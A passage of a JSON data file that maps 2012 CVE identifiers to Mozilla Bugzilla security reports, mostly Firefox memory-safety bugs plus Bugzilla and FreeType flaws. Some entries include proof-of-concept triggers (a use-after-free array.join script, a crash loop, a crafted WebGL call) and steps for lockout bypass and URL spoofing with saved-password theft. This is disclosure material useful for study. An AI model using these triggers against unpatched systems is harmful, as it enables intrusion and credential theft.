        "description": "Before the mozRequestFullscreen API was enabled, window.fullScreen was read-only for untrusted content. Now that the DOM fullscreen API is enabled, window.fullScreen is writeable by untrusted content. This is a side-effect of this patch from bug 545812: https://hg.mozilla.org/mozilla-central/rev/f212867dce42#l8.12 This is dangerous because window.fullScreen does not include mozRequestFullscreen's security mechanisms (e.g. IsHandlingUserInput check, popup notification, escape keys). It could be used in a UI spoofing attack. I think this change was unintentional, and the correct solution is to keep window.fullScreen read-only for untrusted content. Content can use the new DOM fullscreen API instead."
      }
    ],
    "CVE-2012-0463": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=688208",
        "title": "nsWindow for Android doesn't check whether the instance is destroying or not after dispatching an event",
        "description": "Android's nsWindow doesn't hold itself and doesn't check whether it's destroying or not after dispatching an event. I'm not sure that actually causes crash bugs. We should research it. nsWindow might be destroyed by DOM event handler. Mac's widget has fixed this already but I'm not sure the detail and bug#. Steven probably knows the bug#. I think nsWindow for Android should do: + nsRefPtr<nsWindow> kungFuDeathGrip(this); DispatchEvent(event); + if (Destroyed()) { + return; + } And: nsWindow should set nsBaseWidget::mOnDestroyCalled to TRUE when it's destroying. # It seems that nsBaseWidget::OnDestroy() should be called too..."
      }
    ],
    "CVE-2012-0464": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=720079",
        "title": "array.join(\"\") is GC-hazardous",
        "description": "/* Elements beyond the initialized length are 'undefined' and thus can be ignored. */ const Value *beg = obj->getDenseArrayElements(); const Value *end = beg + Min(length, obj->getDenseArrayInitializedLength()); for (const Value *vp = beg; vp != end; ++vp) { if (!JS_CHECK_OPERATION_LIMIT(cx)) return false; if (!vp->isMagic(JS_ARRAY_HOLE) && !vp->isNullOrUndefined()) { if (!ValueToStringBuffer(cx, *vp, sb)) return false; } } ValueToStringBuffer can invoke arbitrary user code, making the raw element iteration patently unsafe. See this, for example (code which should include no random-looking doubles of the sort printed, obviously): [jwalden@wheres-wally src]$ dbg/js js> var arr = [1, 2, 3, 4, 5, 6, 7, { toString: function() { arr.length = 0; gc(); arr.foopy = 17; gc(); arr = null; gc(); var q = 0; while (q++ < 1e3) void {}; gc(); return \"bwhahaha\"; } }, 9, 10, 11, {}, 13, 14, 15, 16, { toString: function() { return 42; } }, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27]; arr.join(\"\") \"1234567bwhahaha95.6e-3221.3796150552635895e-3061.0569372456451826e-3078.900719840310492e-3087.56546841585253e-3071.6021903463369686e-3069.457005280256007e-3087.78797919583446e-3089.346084319948922e-3078.90056706334849e-3081.223875502684094e-3071.390773018919187e-3080231.63e-32201.018557979663e-3121.6e-322\""
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=735104",
        "title": "Array toString Remote Code Execution (ZDI-CAN-1549)",
        "description": "ZDI-CAN-1549: Mozilla Firefox Array toString Remote Code Execution Vulnerability - -- CVSS ----------------------------------------- 9, AV:N/AC:L/Au:N/C:P/I:P/A:C - -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox - -- VULNERABILITY DETAILS ------------------------ /* js/src/jsarray.cpp array_join calls array_toString_sub which has: ... const Value *beg = obj->getDenseArrayElements(); const Value *end = beg + Min(length, obj->getDenseArrayInitializedLength()); for (const Value *vp = beg; vp != end; ++vp) { if (!JS_CHECK_OPERATION_LIMIT(cx)) return false; if (!vp->isMagic(JS_ARRAY_HOLE) && !vp->isNullOrUndefined()) { if (!ValueToStringBuffer(cx, *vp, sb)) return false; } ... ValueToStringBuffer calls back to javascript using a toString function, we can change the array from under it, without beg and end being updated, and the gc will free them since they are not marked as in use. run in Jshell! (else, you need gc code and print code) */ - -- CREDIT --------------------------------------- This vulnerability was discovered by: Vincenzo Iozzo"
      }
    ],
    "CVE-2012-0465": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=728639",
        "title": "[SECURITY] User lockout policy can be bypassed by altering the X-FORWARDED-FOR header",
        "description": "User Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E) Steps to reproduce: It is possible to bypass the user lockout policy by using the \"X-FORWARDED-FOR\" in the header of the request. The problem is because of the \"remote_ip\" function in \"Bugzilla/Util.pm\" which adds this header value to the user's IP address (there is also no validation on this field). However, this \"X-FORWARDED-FOR\" can be controlled by an attacker to brute force the other people username/password. The \"remote_ip\" function also has been used in lockout modules (\"Bugzilla/User.pm: account_ip_login_failures()\") which is the reason of having this issue. Please let me know if it can be eligible for the bug bounty too. Actual results: It is possible to brute force a password without being locked by setting the \"X-FORWARDED-FOR\" value in the header of the authentication request to one of these: 1- A complete random IP or String 2- A string with the length of more than 26 characters. Ex.: \"123456789012345678901234567\" Expected results: It should prevent from brute force attack. My recommendation is: 1- First we need to have a complete validation (characters, length, format) for $ENV{'HTTP_X_FORWARDED_FOR'} in the \"remote_ip\" function. 2- This value should not be used in the user's lockout process as it can be controlled by the user. Only the main IP address should be fine for this action ($ENV{'REMOTE_ADDR'}) although it can be a proxy IP address."
      }
    ],
    "CVE-2012-0466": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=745397",
        "title": "[SECURITY] The JS template for buglists permits attackers to access all bugs that the victim can see",
        "description": "Bug 195530 added a JavaScript template for buglists in Bugzilla 2.17.4. Despite it was written with security in mind (see the 2nd patch there), it's still possible to bypass this security check by forcing buglist.cgi to log in the user again after the check is done, see the PoC (no worry, it tries to access bugs on landfill). To make the PoC work, you must first be logged into https://landfill.bugzilla.org/bugzilla-tip/. The vulnerability exists since 2.17.4. The best way to fix this bug is to remove this JS template. I'm pretty sure that nobody besides gerv and Jesse knows that this template exists (I found it by accident earlier today). Either that, or this code must be moved right before calling Search.pm: if ((defined $cgi->param('ctype')) && ($cgi->param('ctype') eq \"js\")) { Bugzilla->logout_request(); }"
      }
    ],
    "CVE-2012-0468": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=714616",
        "title": "Assertion failure: (ptrBits & 0x7) == 0, at ../../jsval.h:873 or Crash [@ compartment] or [@ js::array_shift]",
        "description": "The following test crashes/asserts on mozilla-central revision d98fbf3cbd71 (options -m -n -a): array1 = new Array(); size = 10; for (i = 0; i < size; (array1.length)++) { array1.push(array1.shift()); } Backtrace of crash on opt64: Program received signal SIGSEGV, Segmentation fault. compartment (length=8, this=<value optimized out>) at /srv/repos/mozilla-central/js/src/jsgc.h:948 948 return arenaHeader()->compartment; (gdb) bt #0 compartment (length=8, this=<value optimized out>) at /srv/repos/mozilla-central/js/src/jsgc.h:948 #1 writeBarrierPre (length=8, this=<value optimized out>) at ../gc/Barrier-inl.h:123 #2 pre (length=8, this=<value optimized out>) at ../gc/Barrier-inl.h:150 #3 ~HeapValue (length=8, this=<value optimized out>) at ../gc/Barrier-inl.h:99 #4 prepareElementRangeForOverwrite (length=8, this=<value optimized out>) at ../jsobjinlines.h:520 #5 JSObject::setDenseArrayInitializedLength (length=8, this=<value optimized out>) at ../jsobjinlines.h:572 #6 0x000000000042394b in js::array_shift (cx=0x8dd310, argc=<value optimized out>, vp=0x7ffff63fb0a8) at /srv/repos/mozilla-central/js/src/jsarray.cpp:2436 #7 0x0000000000481b39 in CallJSNative (cx=0x8dd310, args=..., construct=<value optimized out>) at ../jscntxtinlines.h:311 #8 js::InvokeKernel (cx=0x8dd310, args=..., construct=<value optimized out>) at /srv/repos/mozilla-central/js/src/jsinterp.cpp:524 #9 0x00000000005eba5b in js::mjit::stubs::SlowCall (f=..., argc=0) at /srv/repos/mozilla-central/js/src/methodjit/InvokeHelpers.cpp:196 #10 0x00007ffff7f42f1f in ?? () #11 0x00007ffff7f43186 in ?? () #12 0x0000000000000001 in ?? () #13 0x0000000000000000 in ?? () On 32 bit, the assert is: Assertion failure: addr % Cell::CellSize == 0, at ../../jsgc.h:822"
      }
    ],
    "CVE-2012-0469": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=738985",
        "title": "heap-use-after-free at mozilla::dom::indexedDB::IDBKeyRange::cycleCollection::Trace",
        "description": "ASan reports a heap-use-after-free error when the attached page is opened. The file was minimized against 14.0a1 (2012-03-24) and doesn't seem to reproduce anymore on 12.0, but similar files caused also it to crash during minimization. The trace was https://crash-stats.mozilla.com/report/index/bp-e750dc35-be93-426f-aff3-cd82b2120324 To reproduce, open idb.html in an ASan build and wait about 7 seconds."
      }
    ],
    "CVE-2012-0470": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=734288",
        "title": "ASAN: Heap-buffer-overflow WRITE of size 1 at nsSVGFEDiffuseLightingElement::LightPixel",
        "description": "==5860== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f23312cdda8 at pc 0x7f235665c341 bp 0x7fff1d8b5550 sp 0x7fff1d8b5548 WRITE of size 1 at 0x7f23312cdda8 thread T0 #0 0x7f235665c341 in nsSVGFEDiffuseLightingElement::LightPixel(float const*, float const*, unsigned int, unsigned char*) /home/attekett/src/content/svg/content/src/nsSVGFilters.cpp:5298 #1 0x7f235665ace9 in nsSVGFELightingElement::Filter(nsSVGFilterInstance*, nsTArray<nsSVGFE::Image const*, nsTArrayDefaultAllocator> const&, nsSVGFE::Image const*, nsIntRect const&) /home/attekett/src/content/svg/content/src/nsSVGFilters.cpp:5094 #2 0x7f23565acf04 in nsSVGFilterInstance::Render(gfxASurface**) /home/attekett/src/layout/svg/base/src/nsSVGFilterInstance.cpp:529 #3 0x7f23565a7a93 in nsSVGFilterFrame::FilterPaint(nsRenderingContext*, nsIFrame*, nsSVGFilterPaintCallback*, nsIntRect const*) /home/attekett/src/layout/svg/base/src/nsSVGFilterFrame.cpp:264 #4 0x7f23565df61f in nsSVGUtils::PaintFrameWithEffects(nsRenderingContext*, nsIntRect const*, nsIFrame*) /home/attekett/src/layout/svg/base/src/nsSVGUtils.cpp:1141 #5 0x7f23565a2f8e in nsSVGDisplayContainerFrame::PaintSVG(nsRenderingContext*, nsIntRect const*) /home/attekett/src/layout/svg/base/src/nsSVGContainerFrame.cpp:175 #6 0x7f23565ceb59 in nsSVGOuterSVGFrame::Paint(nsDisplayListBuilder const*, nsRenderingContext*, nsRect const&, nsPoint) /home/attekett/src/layout/svg/base/src/nsSVGOuterSVGFrame.cpp:672 #7 0x7f23565ce8bb in nsDisplaySVG::Paint(nsDisplayListBuilder*, nsRenderingContext*) /home/attekett/src/layout/svg/base/src/nsSVGOuterSVGFrame.cpp:566 #8 0x7f23556aa9de in mozilla::FrameLayerBuilder::DrawThebesLayer(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*) /home/attekett/src/layout/base/FrameLayerBuilder.cpp:2250 #9 0x7f235747013b in mozilla::layers::BasicThebesLayer::PaintBuffer(gfxContext*, nsIntRegion const&, nsIntRegion const&, nsIntRegion const&, bool, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*) /home/attekett/src/gfx/layers/basic/BasicLayers.cpp:570 #10 0x7f23574696db in mozilla::layers::BasicShadowableThebesLayer::PaintBuffer(gfxContext*, nsIntRegion const&, nsIntRegion const&, nsIntRegion const&, bool, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*) /home/attekett/src/gfx/layers/basic/BasicLayers.cpp:2395 #11 0x7f23574627b5 in mozilla::layers::BasicThebesLayer::PaintThebes(gfxContext*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) /home/attekett/src/gfx/layers/basic/BasicLayers.cpp:770 #12 0x7f23574671fa in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) /home/attekett/src/gfx/layers/basic/BasicLayers.cpp:1951 #13 0x7f2357467356 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) /home/attekett/src/gfx/layers/basic/BasicLayers.cpp:1967 #14 0x7f2357467356 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) /home/attekett/src/gfx/layers/basic/BasicLayers.cpp:1967 #15 0x7f2357465af1 in mozilla::layers::BasicLayerManager::EndTransactionInternal(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) /home/attekett/src/gfx/layers/basic/BasicLayers.cpp:1658 #16 0x7f235746db49 in mozilla::layers::BasicShadowLayerManager::EndTransaction(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) /home/attekett/src/gfx/layers/basic/BasicLayers.cpp:3398 #17 0x7f23557607f7 in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int) /home/attekett/src/layout/base/nsLayoutUtils.cpp:1852 #18 0x7f235579ccfd in PresShell::Paint(nsIView*, nsIWidget*, nsRegion const&, nsIntRegion const&, bool) /home/attekett/src/layout/base/nsPresShell.cpp:5409 #19 0x7f23560513e4 in nsViewManager::Refresh(nsView*, nsIWidget*, nsIntRegion const&, bool) /home/attekett/src/view/src/nsViewManager.cpp:376 #20 0x7f23560531e4 in nsViewManager::DispatchEvent(nsGUIEvent*, nsIView*, nsEventStatus*) /home/attekett/src/view/src/nsViewManager.cpp:813 #21 0x7f235604dd61 in HandleEvent /home/attekett/src/view/src/nsView.cpp:159 #22 0x7f2356d813fb in nsWindow::DispatchEvent(nsGUIEvent*, nsEventStatus&) /home/attekett/src/widget/gtk2/nsWindow.cpp:524 #23 0x7f2356d95a92 in expose_event_cb /home/attekett/src/widget/gtk2/nsWindow.cpp:5393 #24 0x7f2351dae578 in _gtk_marshal_BOOLEAN__BOXED /build/buildd/gtk+2.0-2.24.4/gtk/gtkmarshalers.c:90 0x7f23312cdda8 is located 0 bytes to the right of 40-byte region [0x7f23312cdd80,0x7f23312cdda8) allocated by thread T0 here: #0 0x40cf8c in posix_memalign ??:0 #1 0x7f23573f0dec in TryAllocAlignedBytes /home/attekett/src/gfx/thebes/gfxImageSurface.cpp:117 #2 0x7f23573f0a8a in gfxImageSurface::gfxImageSurface(nsIntSize const&, gfxASurface::gfxImageFormat) /home/attekett/src/gfx/thebes/gfxImageSurface.cpp:139 ==5860== ABORTING Stats: 56M malloced (83M for red zones) by 243696 calls Stats: 3M realloced by 15734 calls Stats: 33M freed by 132010 calls Stats: 0M really freed by 0 calls Stats: 176M (45077 full pages) mmaped in 44 calls mmaps by size class: 8:229362; 9:24573; 10:8190; 11:8188; 12:2048; 13:1024; 14:768; 15:256; 16:256; 17:64; 18:64; 19:8; 20:4; mallocs by size class: 8:207343; 9:20575; 10:6910; 11:5610; 12:1534; 13:763; 14:511; 15:145; 16:203; 17:34; 18:60; 19:5; 20:3; frees by size class: 8:110634; 9:11973; 10:4318; 11:2910; 12:920; 13:593; 14:367; 15:112; 16:138; 17:29; 18:11; 19:3; 20:2; rfrees by size class: Stats: malloc large: 102 small slow: 971 Shadow byte and word: 0x1fe466259bb5: fb 0x1fe466259bb0: 00 00 00 00 00 fb fb fb More shadow bytes: 0x1fe466259b90: 00 00 00 00 00 00 00 00 0x1fe466259b98: 00 fb fb fb fb fb fb fb 0x1fe466259ba0: fa fa fa fa fa fa fa fa 0x1fe466259ba8: fa fa fa fa fa fa fa fa =>0x1fe466259bb0: 00 00 00 00 00 fb fb fb 0x1fe466259bb8: fb fb fb fb fb fb fb fb 0x1fe466259bc0: fa fa fa fa fa fa fa fa 0x1fe466259bc8: fa fa fa fa fa fa fa fa 0x1fe466259bd0: 00 fb fb fb fb fb fb fb"
      }
    ],
    "CVE-2012-0471": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=715319",
        "title": "More multi-octet encoding issues",
        "description": "Since this seems to be the same kind of issues as bug 690225 marking it security sensitive for now. In euc-jp 0x8F \"eats\" the next two octets. In hz-gb-2312 anything above 0x7E will eat the next octet. (Every other implementation of hz-gb-2312 I have seen just replaces each octet above 0x7E with U+FFFD by the way.) I have not really done extensive research, but I suspect there is more."
      }
    ],
    "CVE-2012-0472": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=744480",
        "title": "cairo_dwrite_font_face Memory Corruption Vulnerability [V-49y00m3lf2]",
        "description": "iDefense VCP Submission V-49y00m3lf2 04/11/2012 Mozilla Firefox cairo_dwrite_font_face Memory Corruption Vulnerability (iDefense Exclusive) Description: Analysis: Credit: wushi of team509"
      }
    ],
    "CVE-2012-0473": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=743475",
        "title": "WebGLBuffer::FindMaxUshortElement passes wrong template arguments to FindMaxElementInSubArray",
        "description": "WebGLBuffer::FindMaxUshortElement in content/canvas/src/WebGLContext.h passes GLshort instead of GLushort to FindMaxElementInSubArray, even though only GLubyte or GLushort should be used. I've attached a patch to fix the issue."
      }
    ],
    "CVE-2012-0474": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=687745",
        "title": "(CVE-2012-0474) URL & SSL/TLS Spoofing and saved password stealing using multiple history.back() and history.forward()",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2 Build ID: 20110902133214 Steps to reproduce: The problem originated is from the creation of a link with javascript (window.open ; document.location ; back() ; forward() ; fragment navigation and Redirect.) . When you open a new tab via window.open on another address (with SSL or not) and use all of this elements, it's possible to spoof the URL and SSL/TLS. It's also possible to steal saved password on Mozilla firefox if the web page spoofed contains a form with saved password. the form should be like : <form ACTION=\"/connect.php\"> but not like this : <form ACTION=\"HTTP://www.xxx.yyy/connect.php\"> for steal the saved password and login (I have chosen linkedin.com for demonstrate this). This blank page can be changed with javascript with making a spoofing attak. Actual results: URL with SSL/TLS is Spoofed and we can steal saved password of linkedin.com (and many other website with a connection formulary's like linkedin.com) /!\\ I had found a very similare vulnerability on Google chrome in the past (same impact => SecSeverity:high)"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=737307",
        "title": "universal XSS by confusing docshell with short-circuited loads",
        "description": "User Agent: Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2 Build ID: 20120215223356 Steps to reproduce: Use javascript to open new window of location on same domain. On new window, history.pushState change to same or other location on same domain. Change location of window to foreign website. History.back. History.forward. History.back. Actual results: Foreign website is loaded with my url. Also, the javascript on that page then sends requests to my domain. Private information can be obtained from these requests. Expected results: Loading of a different domain should cancel the history change."
      }
    ],
    "CVE-2012-0475": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=694576",
        "title": "Ambiguous IPv6 in Origin (and Sec-WebSocket-Origin) request header",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.187 Safari/535.1 Steps to reproduce: having a html page on a web server listening on a non-80 port, and accessing such page specifiyng as host the IPv6 of such webserver (obviously plus its port...): If you open a cross-site XHR or WebSocket it will result in the browser sending an ambiguous Origin (or Sec-WebSocket-Origin) header if the said IPv6 contains at least 2 consecutive 16-bit fields of 0s. I think that at least at the moment this ambiguity does not pose security issues as I expect that most resources will not have a Origin permission list based on IPv6, but I'm flagging the hidden check anyway (better safe than sorry...) I've seen the same behaviour on Firefox 7.0.1 and Aurora 9.0a2 related specs/drafts: CORS http://www.w3.org/TR/cors WebSockets http://tools.ietf.org/html/draft-ietf-hybi-thewebsocketprotocol-17 IPv6 http://tools.ietf.org/html/rfc5952 Origin http://tools.ietf.org/html/draft-ietf-websec-origin-06 & http://tools.ietf.org/html/draft-abarth-origin-09 Actual results: Let's say that the web server is listening on port 8888 and can be reached with its IPv6 that is aa80:0000:0000:0000:19b7:231e:ff5d:34e3 (that compressed is aa80::19b7:231e:ff5d:34e3). The Origin header generated by Firefox will be like this: http://aa80::19b7:231e:ff5d:34e3:8888 Now let's say that the web server is listening on port 80 and can be reached with its IPv6 that is aa80:0000:0000:19b7:231e:ff5d:34e3:8888 (that compressed is aa80::19b7:231e:ff5d:34e3:8888). The Origin header generated by Firefox will be the same: http://aa80::19b7:231e:ff5d:34e3:8888 Expected results: The ambiguity is easily solved using square brakets so that the 2 Origins can be http://[aa80::19b7:231e:ff5d:34e3]:8888 and http://[aa80::19b7:231e:ff5d:34e3:8888] (at least Chrome behave like this)"
      }
    ],
    "CVE-2012-0477": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=718573",
        "title": "Potential XSS attack with ISO-2022-KR/ISO-2022-CN near 1024 bytes",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.0; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 Build ID: 20111220165912 Steps to reproduce: Firefox has risk of potential XSS on ISO-2022-KR/ISO-2022-CN page. Actual results: On ISO-2022-KR page, characters near 1024 bytes is copied on back. On ISO-2022-CN page, characters near 1024 bytes is deleted. Expected results: Firefox should not copy or delete."
      }
    ],
    "CVE-2012-0478": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=727547",
        "title": "nsIDOMWebGLRenderingContext_Tex{,Sub}Image2D use JSVAL_TO_OBJECT on arbitrary objects",
        "description": "Something like this should do the trick: webglcontext.texImage2D(0, 0, 0, 0, 0, { width: 10, height: 10, data: 7 }) I'd test it, but we don't support WebGL on my hardware. Code was added in bug 573705."
      }
    ],
    "CVE-2012-1126": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 